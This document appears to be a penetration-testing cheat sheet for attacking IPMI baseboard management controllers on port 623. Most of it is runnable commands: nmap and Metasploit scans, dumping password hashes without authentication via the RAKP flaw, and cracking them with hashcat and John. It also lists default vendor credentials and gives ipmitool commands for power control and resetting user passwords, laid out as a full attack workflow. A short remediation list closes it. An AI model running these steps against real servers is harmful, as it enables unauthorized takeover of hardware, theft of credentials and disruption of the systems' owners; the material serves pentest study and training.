# IPMI (Port 623)

Exploit Intelligent Platform Management Interface (IPMI) to gain remote hardware control and retrieve password hashes.
IPMI provides out-of-band management for servers, allowing remote power control, BIOS access, and system monitoring even when the OS is down.

## Quick Reference

### Check IPMI Version
```bash
sudo nmap -sU -p 623 --script ipmi-version 10.10.10.10
```

### Dump Password Hashes
```bash
# Metasploit
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
run
```

## Enumeration

### Nmap
```bash
# IPMI version detection
sudo nmap -sU -p 623 --script ipmi-version 10.10.10.10

# IPMI cipher suite scan
sudo nmap -sU -p 623 --script ipmi-cipher-zero 10.10.10.10
```

### Metasploit Discovery
```bash
# IPMI version scanner
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS 10.10.10.0/24
run
```

## Default Credentials

### Common Vendor Defaults

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | Randomized 8-char string |
| Supermicro IPMI | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD (with zero) |
| Fujitsu iRMC | admin | admin |
| Oracle/Sun ILOM | root | changeme |
| ASUS iKVM BMC | admin | admin |

### Test Default Credentials
```bash
# Using ipmitool
ipmitool -I lanplus -H 10.10.10.10 -U root -P calvin user list

# Using Metasploit
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## IPMI 2.0 RAKP Authentication Bypass

### Dump Password Hashes (No Authentication Required)
```bash
# Metasploit module
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
set OUTPUT_JOHN_FILE ipmi_hashes.john
set OUTPUT_HASHCAT_FILE ipmi_hashes.hashcat
run
```

### Crack Retrieved Hashes

#### Hashcat
```bash
# IPMI2 RAKP HMAC-SHA1 (mode 7300)
hashcat -m 7300 ipmi_hashes.hashcat /usr/share/wordlists/rockyou.txt

# Mask attack (8 chars, uppercase + digits)
hashcat -m 7300 ipmi_hashes.hashcat -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

#### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ipmi_hashes.john
```

## ipmitool Usage

### Basic Commands
```bash
# Get system info
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin chassis status

# List users
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin user list

# Get sensor data
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin sensor list

# Get system event log
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin sel list
```

### Power Control
```bash
# Power status
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin power status

# Power on
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin power on

# Power off
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin power off

# Power cycle
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin power cycle

# Reset
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin power reset
```

### User Management
```bash
# List users
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin user list

# Set user password
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin user set password 2 newpassword

# Enable user
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin user enable 2
```

## Exploitation Impact

### What Attackers Can Do
- Power off, reboot, or control server remotely
- Access BIOS and boot settings
- Mount virtual media (ISO files)
- Access system console
- Monitor hardware sensors
- Retrieve system logs
- Modify user accounts
- Change network settings

## Metasploit Modules

### IPMI Hash Dumper
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.0/24
set THREADS 256
set OUTPUT_HASHCAT_FILE ipmi.hashcat
run
```

### IPMI Cipher Zero
```bash
# Test for cipher zero vulnerability
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS 10.10.10.10
run
```

## Common Workflow

### Full IPMI Assessment
```bash
# 1. Discover IPMI service
sudo nmap -sU -p 623 --script ipmi-version 10.10.10.0/24

# 2. Dump password hashes
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
set OUTPUT_HASHCAT_FILE ipmi.hashcat
run

# 3. Crack hashes
hashcat -m 7300 ipmi.hashcat /usr/share/wordlists/rockyou.txt

# 4. Test default credentials
ipmitool -I lanplus -H 10.10.10.10 -U root -P calvin user list

# 5. If successful, enumerate system
ipmitool -I lanplus -H 10.10.10.10 -U root -P calvin chassis status
ipmitool -I lanplus -H 10.10.10.10 -U root -P calvin user list
ipmitool -I lanplus -H 10.10.10.10 -U root -P calvin sel list
```

## Notes

**IPMI 2.0 RAKP Vulnerability:**
- Allows retrieving password hashes without authentication
- Affects IPMI 2.0 implementations
- Hashes can be cracked offline
- No authentication required to dump hashes
- Vendor patches may not fix this fundamental protocol flaw

**Security Considerations:**
- IPMI provides complete hardware control
- Often uses default credentials
- Typically on separate management network
- May be accessible from internet if misconfigured
- Compromise gives attacker physical-level access

**Common Misconfigurations:**
- Default credentials not changed
- IPMI exposed to internet
- Weak passwords
- No network segmentation
- Cipher zero enabled
- Anonymous access allowed

**BMC Implementations:**
- Dell iDRAC (Integrated Dell Remote Access Controller)
- HP iLO (Integrated Lights-Out)
- Supermicro IPMI
- IBM IMM (Integrated Management Module)
- Fujitsu iRMC (Integrated Remote Management Controller)

**Attack Surface:**
- Password hash retrieval (RAKP)
- Default credentials
- Weak passwords
- Cipher zero vulnerability
- Network exposure
- Outdated firmware

**Remediation:**
- Change default credentials immediately
- Use strong, unique passwords
- Restrict IPMI to management network
- Disable cipher zero
- Update firmware regularly
- Monitor IPMI access logs
- Use VPN for remote access
